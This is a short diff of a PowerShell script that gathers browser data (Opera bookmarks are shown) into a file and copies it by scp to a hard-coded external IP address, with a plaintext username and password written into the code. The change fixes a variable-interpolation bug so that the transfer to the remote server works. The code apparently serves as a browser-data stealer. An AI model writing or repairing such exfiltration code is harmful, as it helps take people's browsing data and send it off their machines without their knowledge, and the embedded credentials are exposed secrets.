@@ -75,17 +75,17 @@ try {
     Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile
     Write-Log "Opera bookmarks collected."
     
-   # SCP the file to a remote server
+    # SCP the file to a remote server
     $RemoteUser = "Benjak617"
     $RemoteServer = "174.51.68.96"
     $RemotePath = "/"
     $Password = "Snowman1234!"
     $SCPCommand = "scp.exe"
-    $Args = @("$OutputFile", "$RemoteUser@$RemoteServer:$RemotePath")
+    $scpArgs = @("$OutputFile", "$RemoteUser@${RemoteServer}:$RemotePath")
 
     Write-Log "Initiating SCP transfer."
-    
-    Start-Process -FilePath $SCPCommand -ArgumentList $Args -Wait -ErrorAction Stop
+
+    Start-Process -FilePath $SCPCommand -ArgumentList $scpArgs -Wait -ErrorAction Stop
     Write-Log "SCP transfer completed successfully."
 
     # Clean up
